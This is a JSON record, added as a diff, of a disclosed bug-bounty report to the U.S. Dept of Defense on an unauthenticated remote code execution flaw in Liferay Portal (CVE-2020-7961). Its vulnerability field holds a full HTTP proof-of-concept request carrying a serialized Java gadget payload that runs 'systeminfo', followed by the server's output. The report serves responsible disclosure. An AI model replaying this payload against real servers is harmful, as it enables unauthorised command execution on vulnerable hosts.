@@ -1,0 +1,120 @@
+﻿{
+  "id": 2742457,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yNzQyNDU3",
+  "url": "https://hackerone.com/reports/2742457",
+  "title": "CVE-2020-7961 RCE Liferay Portal Unauthenticated via https://████████/",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "critical",
+  "readable_substate": "Resolved",
+  "created_at": "2024-09-26T08:25:28.329Z",
+  "submitted_at": "2024-09-26T08:25:28.536Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "exploitmsf",
+    "url": "/exploitmsf",
+    "profile_picture_urls": {
+      "small": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/k2782kz2seyuu91q1upok5u1oli6/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef?response-content-disposition=inline%3B%20filename%3D%2266761507_2345294599091262_1115619614856839168_n.jpg%22%3B%20filename%2A%3DUTF-8%27%2766761507_2345294599091262_1115619614856839168_n.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIA_REDACTED_KEY%2F20260509%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260509T150253Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEB4aCXVzLXdlc3QtMiJIMEYCIQCTXpxsFPt1L%2FkCxOVB1B3bBXWaNOlY5wahEl5r2sxxBgIhANZZTGMjD1dUdM6hu53hcgIE%2BhLd%2F5bYa3ZdxidZkTITKroFCOf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5Igx%2FJgTOGH7sfsex8cIqjgU0qgSJ9WhXa7evAxE%2B%2BIf9cl6N4OunmKi1bbV3Gj4oEXwaOD6BD53PpBRgoDh3BKRK1f7KsrMtk7oQKfjJkC24OrFpqNdFReGiSfZ1iwGS3LhDzFVwQdn1%2BK8Ol6C6ex3caYbFTIhVw0SAtKwqliL%2F93RaJd7oREgGvzI8IG0T3IAxQX7%2FCcOBfHTXizPiBLNrfLpqwm0Nwl2%2F1nMwD%2FIlZVXXGLkOMUb1J4dBuH2ILkLdJY5uvzxYr80JyJqgUzwRAkazE1oYfLyHJGRBgJHJ2dA1FSp7B%2BGFd%2Fo%2FfcRyyL7GyD%2BuH8BKk%2F0bR8j9qmQnftDc7%2B4mafAudu0YWNx47h7wl0lF9X9f5SnqU4ImIYjPUeS8zJ%2BElpfJAshC9lqkuO1uuQrQlknnzGulGKpUkLj3dE0y2TI5tUrjC%2FtF8%2FIsUntd2eVaBF%2FYE%2BelZD6Zftc9ZvvVQhImYlFGiHGzEun8Zp77ikhc7pdZNm55EhQZoQW0aLxeUZRGEDT65OOfGiqUSk0YPu1y7idAZZy7M5yu8GzeYOvmYsGOt0aKWBoH6bquc9IcUzfFKfSiTQ1vsts7yC3dadpPkBxwfBkn9bh6bKJf7CAFfueAhP%2Fbc%2By%2FEF3wSNK%2BE2PDtFfzNfck9xkYhPJbdwq8L11C4x3EM7BkGkGGjoml%2FCdzIWn9jXxMZhMejeAheaWqKqnR4rmFmYlvfiJLpuQAouvvUzpfQo%2BuzwtTLMJrl8P%2FoIH7WVxm2WwZy4tO%2Blx3c7%2F7fv9LSeE5E%2FOgOg%2B6bSI4RkNXAtNyPDG%2FeY7u5VFXYYHBgji2BWbqq0UGfKEvusUXUVtwFuAniojpSOzeVkfC9Oow64qoX4LMGa%2FZlsSi55wwtv78zwY6sAFsfiizT40h6BNyeJmgpnfo1N6cLUC4QuJhp2F6NPTJJuTaz%2F0q%2Fv4xHYTI8pFZShEkmnGRggZOoBtIuL5ZHtnM2olXFY3CVC9y72drP3OwIIToCP3Ui4zOhTQV2R78aLq8IQJyVf7nMR6yVlk2gQI1svAuSOAjVsTkyK%2Bd7vItexRmem3Td1bRFMAPLnCKsHM5FYhtHwhI%2BaSL6Y2BjpQeVoBT5xKJrTpvsPBYzzJp%2FA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=4c62cea6de8e4da96d2f93e3d9ba596a00a449431f2a177d0983cce5cfa2b145"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 16064,
+    "url": "https://hackerone.com/deptofdefense",
+    "handle": "deptofdefense",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/016/064/46cd0286b1fa224aaa2cb9dfaaca9fa22b5b80b2_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/016/064/46cd0286b1fa224aaa2cb9dfaaca9fa22b5b80b2_original.png/3f1ab5c6a9b6dadada1e6c81217REDACTED_SALESFORCE_IDfee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "U.S. Dept Of Defense",
+      "twitter_handle": "DC3VDP",
+      "website": "https://bit.ly/3ntULtN",
+      "about": ""
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+    "CVE-2020-7961"
+  ],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2024-10-25T15:26:02.667Z",
+  "bug_reporter_agreed_on_going_public_at": "2024-10-21T10:13:38.652Z",
+  "team_member_agreed_on_going_public_at": "2024-10-25T15:26:02.492Z",
+  "comments_closed?": true,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "poc: \n```\nPOST /api/jsonws/invoke HTTP/1.1\nHost: ████████\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0\nContent-Length: 4939\nContent-Type: application/x-www-form-urlencoded\nReferer: https://██████//api/jsonws?contextName=&signature=%2Fexpandocolumn%2Fadd-column-4-tableId-name-type-defaultData\ncmd2: systeminfo\nAccept-Encoding: gzip\n\ncmd=%7B%22%2Fexpandocolumn%2Fadd-column%22%3A%7B%7D%7D&p_auth=tdmrl&formDate=1597704739243&tableId=1&name=A&type=1&%2BdefaultData:com.mchange.v2.c3p0.WrapperConnectionPoolDataSource=%7B%22userOverridesAsString%22%3A%22HexAsciiSerializedMap%3AACEDREDACTED_SALESFORCE_ID612E7574696C2E48617368536574BA44859596B8B73403REDACTED_SALESFORCE_ID023F4REDACTED_SALESFORCE_ID0346F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E6B657976616C75652E546965644D6170456E7472798AADD29B39C11FDB02REDACTED_SALESFORCE_IDREDACTED_SALESFORCE_ID616E672F4F626A6563743B4CREDACTED_SALESFORCE_ID6A6176612F7574696C2F4D61703B787074REDACTED_SALESFORCE_ID6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E6D61702E4C617A794D61706EE594829E79109403REDACTED_SALESFORCE_ID6F727974REDACTED_SALESFORCE_ID616368652F636F6D6D6F6E732F636F6C6C656374696F6E732F5472616E73666F726D65723B78707372REDACTED_SALESFORCE_ID6368652E636F6D6D6F6E732E636F6C6C656374696F6E732E66756E63746F72732E436861696E65645472616E73666F726D657230C797EC287A97040200015B0REDACTED_SALESFORCE_TOKEN%3B%22%7D\n```\nAttacker can read response from system for command systeminfo \n```\nHost Name:                █████████\nOS Name:                   Microsoft Windows Server 2019 Standard\nOS Version:                10.0.17763 N/A Build 17763\nOS Manufacturer:           Microsoft Corporation\nOS Configuration:          Member Server\nOS Build Type:             Multiprocessor Free\nRegistered Owner:        ███████\nRegistered Organization: ███\nProduct ID:                00429-70000-00000-AA946\nOriginal Install Date:     8/5/2023, 8:02:29 PM\nSystem Boot Time:          9/25/2024, 11:45:46 AM\nSystem Manufacturer:       Microsoft Corporation\nSystem Model:              Virtual Machine\nSystem Type:               x64-based PC\nProcessor(s):              1 Processor(s) Installed.\n                           [01]: Intel64 Family 6 Model 85 Stepping 7 GenuineIntel ~2195 Mhz\nBIOS Version:              Microsoft Corporation Hyper-V UEFI Release v4.0, 12/17/2019\nWindows Directory:         C:\\WINDOWS\nSystem Directory:          C:\\WINDOWS\\system32\nBoot Device:               \\Device\\HarddiskVolume1\nSystem Locale:             en-us;English (United States)\nInput Locale:              en-us;English (United States)\nTime Zone:                 (UTC-05:00) Eastern Time (US & Canada)\nTotal Physical Memory:     131,071 MB\nAvailable Physical Memory: 123,442 MB\nVirtual Memory: Max Size:  146,200 MB\nVirtual Memory: Available: 131,089 MB\nVirtual Memory: In Use:    15,111 MB\nPage File Location(s):     C:\\pagefile.sys\nDomain:                    ███████\nLogon Server:              N/A\nHotfix(s):                 17 Hotfix(s) Installed.\n                           [01]: KB5041974\n                           [02]: KB4470788\n                           [03]: KB4486153\n                           [04]: KB4577586\n                           [05]: KB5005112\n                           [06]: KB5043050\n                           [07]: KB5028316\n                           [08]: KB5030505\n                           [09]: KB5031589\n                           [10]: KB5032306\n                           [11]: KB5034863\n                           [12]: KB5035963\n                           [13]: KB5037017\n                           [14]: KB5039335\n                           [15]: KB5040563\n                           [16]: KB5041577\n                           [17]: KB5043126\nNetwork Card(s):           2 NIC(s) Installed.\n                           [01]: Microsoft Hyper-V Network Adapter\n                                 Connection Name: Ethernet 13\n                                 DHCP Enabled:    No\n                                 IP address(es)\n                                 [01]: █████████\n                           [02]: Microsoft Hyper-V Network Adapter\n                                 Connection Name: Ethernet 14\n                                 Status:          Hardware not present\nHyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.\n```\n█████\n\n## Impact\n\nAttacker can execute commands on server\n\n## System Host(s)\n█████\n\n## Affected Product(s) and Version(s)\n\n\n## CVE Numbers\nCVE-2020-7961\n\n## Steps to Reproduce\nI write steps in Description\n\n## Suggested Mitigation/Remediation Actions\n\n\n",
+  "weakness": {
+    "id": 59,
+    "name": "OS Command Injection"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 61,
+  "voters": [
+    "kanon4",
+    "7orus",
+    "orange303",
+    "almuntadhar0x01",
+    "exec_iq",
+    "exploitmsf",
+    "im4x",
+    "thalaivar304",
+    "hackermaneia_",
+    "ahmed_xyz",
+    "and 51 more..."
+  ],
+  "severity": {
+    "rating": "critical",
+    "author_type": "Team"
+  },
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
